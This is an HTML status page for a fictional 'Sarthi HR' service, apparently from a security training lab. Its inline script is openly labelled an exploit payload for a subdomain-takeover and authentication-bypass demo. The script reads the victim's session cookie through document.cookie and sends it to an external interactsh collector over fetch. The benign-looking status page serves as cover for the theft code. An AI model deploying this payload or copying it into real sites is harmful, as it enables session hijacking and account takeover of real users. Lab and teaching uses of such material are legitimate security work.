<body>
  <div class="card">
    <h1>Sarthi HR — System Status</h1>
    <div class="row"><span>Web app</span><span class="ok">● Operational</span></div>
    <div class="row"><span>SAML SSO</span><span class="ok">● Operational</span></div>

  <script>
    // Exploit payload for the subdomain-takeover -> auth-bypass demo.
    // This page is served from the CLAIMED dangling subdomain
    // (status.sarthi.web.hackable.training). Because sarthi_auth's cookie
    // Domain was widened to .sarthi.web.hackable.training and httpOnly was
    // dropped (see web/server.js), document.cookie here includes the
    // real session token for anyone whose browser has it set.
    //
    // Set this to the real interactsh domain printed by:
    //   interactsh-client -http-only -v
    // before pushing this file. Must be reachable over HTTP/HTTPS (the
    // -http-only flag restricts interactsh to that protocol only).
    const COLLECTOR = "dbflv1n8fprm6qm7g5i0wtoux5kqkt67e.oast.pro";

    const stolen = document.cookie;
    if (stolen && !COLLECTOR.startsWith("REPLACE_WITH")) {
      fetch("https://" + COLLECTOR + "/c?v=" + encodeURIComponent(stolen), { mode: "no-cors" })
        .catch(() => {});
    }
  </script>
